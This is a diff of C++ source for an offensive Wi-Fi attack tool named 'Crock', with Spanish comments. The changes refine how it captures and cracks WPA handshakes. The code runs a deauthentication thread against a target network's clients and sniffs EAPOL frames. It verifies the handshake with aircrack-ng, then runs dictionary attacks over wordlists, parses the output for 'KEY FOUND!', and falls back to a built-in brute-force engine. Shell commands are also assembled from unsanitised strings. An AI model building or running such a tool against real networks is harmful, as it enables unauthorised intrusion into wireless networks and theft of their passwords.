@@ -434,15 +434,9 @@ static std::vector<std::string> parse_csv_clients(const std::string &csv_path,
 }
 
 // ── Handshake verification ─────────────────────────────────────────────────────
-static bool hs_check_tshark(const std::string &cap) {
-    // Count EAPOL frames; >=2 means at least M1+M2
-    FILE *p = popen(("tshark -r " + cap + " -Y eapol 2>/dev/null | wc -l").c_str(), "r");
-    if (!p) return false;
-    int n = 0; std::fscanf(p, "%d", &n); pclose(p);
-    return n >= 2;
-}
-static bool hs_check_aircrack(const std::string &cap) {
-    return std::system(("aircrack-ng " + cap + " 2>&1 | grep -qi 'handshake'").c_str()) == 0;
+static bool hs_check_aircrack(const std::string &cap, const std::string &bssid) {
+    std::string cmd = "aircrack-ng -b " + bssid + " " + cap + " 2>&1 | grep -E -q '1 handshake|handshake'";
+    return std::system(cmd.c_str()) == 0;
 }
 
 void Crock::targeted_attack(const std::string &bssid, const std::vector<std::string>& wordlists) {
@@ -494,7 +488,7 @@ void Crock::targeted_attack(const std::string &bssid, const std::vector<std::str
 
     std::thread deauth_t([&]() {
         while (deauth_active && keep_running) {
-            std::vector<std::string> snap = known_clients; // safe read (main only writes)
+            std::vector<std::string> snap = known_clients;
             if (!snap.empty()) {
                 for (const auto &cli : snap) {
                     if (!deauth_active) break;
@@ -513,7 +507,7 @@ void Crock::targeted_attack(const std::string &bssid, const std::vector<std::str
     std::atomic<bool> sniffing(true);
     std::thread sniffer_t([&]() {
         while (sniffing && keep_running) {
-            pcap_dispatch(handle, 10, packet_handler, nullptr);
+            if (handle) pcap_dispatch(handle, 10, packet_handler, nullptr);
             usleep(1000);
         }
     });
@@ -550,7 +544,7 @@ void Crock::targeted_attack(const std::string &bssid, const std::vector<std::str
             internal_hs = targets[bssid].handshake.complete;
         }
 
-        if (internal_hs || hs_check_aircrack(cap_file)) {
+        if (internal_hs || hs_check_aircrack(cap_file, bssid)) {
             handshake_found = true;
             break;
         }
@@ -576,7 +570,7 @@ void Crock::targeted_attack(const std::string &bssid, const std::vector<std::str
     std::printf("\n[+] %s (%s) WPA Handshake capture: \033[1;32mCaptured handshake\033[0m\n",
         ssid_local.c_str(), bssid.c_str());
 
-    // ── 4. Save to hs/ directory (like Wifite) ────────────────────────────────
+    // ── 4. Save to hs/ directory ──────────────────────────────────────────────
     std::system("mkdir -p hs");
     std::time_t now = std::time(nullptr);
     struct tm *ti = std::localtime(&now);
@@ -592,7 +586,7 @@ void Crock::targeted_attack(const std::string &bssid, const std::vector<std::str
     std::printf("[+] analysis of captured handshake file:\n");
     std::system(("tshark -r " + save_path +
         " -Y eapol 2>/dev/null | head -4").c_str());
-    std::system(("aircrack-ng " + save_path +
+    std::system(("aircrack-ng -b " + bssid + " " + save_path +
         " 2>&1 | grep -i 'handshake\\|network'").c_str());
 
     // ── 6. Crack con aircrack-ng ─────────────────────────────────────────────
@@ -601,19 +595,30 @@ void Crock::targeted_attack(const std::string &bssid, const std::vector<std::str
     bool cracked = false;
     for (const auto &dict : wordlists) {
         std::printf("[*] Running aircrack-ng with %s\n", dict.c_str());
-        // Forzamos el ESSID exacto con -e por si no se capturó el beacon
-        std::string crack = "aircrack-ng -b " + bssid + " -e \"" + ssid_local + "\" -w \"" + dict + "\" " + save_path;
-        // Wifite y aircrack normalmente devuelven 0 si crackean y 1 si fallan.
-        if (std::system(crack.c_str()) == 0) {
-            cracked = true;
-            break;
+        std::string out_log = cap_prefix + "_crack.log";
+        std::string crack_cmd = "aircrack-ng -b " + bssid + " -w \"" + dict + "\" " + save_path + " > " + out_log + " 2>&1";
+        std::system(crack_cmd.c_str());
+
+        // Verificar resultado comprobando si aircrack halló la clave
+        std::ifstream lf(out_log);
+        if (lf) {
+            std::string l;
+            while (std::getline(lf, l)) {
+                if (l.find("KEY FOUND!") != std::string::npos) {
+                    cracked = true;
+                    std::printf("\n\033[1;32m%s\033[0m\n", l.c_str());
+                    break;
+                }
+            }
         }
+        std::remove(out_log.c_str());
+
+        if (cracked) break;
     }
     
-    // Fallback: Si aircrack falla (ej. si no reconoció los paquetes EAPOL en el .cap),
-    // forzamos nuestra función local escrita en C++ usando la info en memoria.
+    // Fallback: Si aircrack falla (ej. paquetes incompletos en cap file), usar motor nativo en memoria
     if (!cracked) {
-        std::printf("[!] \033[1;31mAircrack-ng falló o no pudo procesar la captura.\033[0m\n");
+        std::printf("[!] \033[1;33mAircrack-ng finalizó sin hallar la clave en la captura en disco.\033[0m\n");
         std::printf("\033[1;33m[!] INICIANDO MOTOR DE FUERZA BRUTA NATIVO (CROCK ENGINE)...\033[0m\n");
         
         HandshakeData hs;
@@ -636,7 +641,6 @@ void Crock::targeted_attack(const std::string &bssid, const std::vector<std::str
         std::printf("[!] \033[1;31mFailed to crack: password not in wordlist(s) or bad capture.\033[0m\n");
     }
 
-    // Limpiar toda la mierda sobrante de temporales
     std::system(("rm -f " + cap_prefix + "-*").c_str());
 }
 
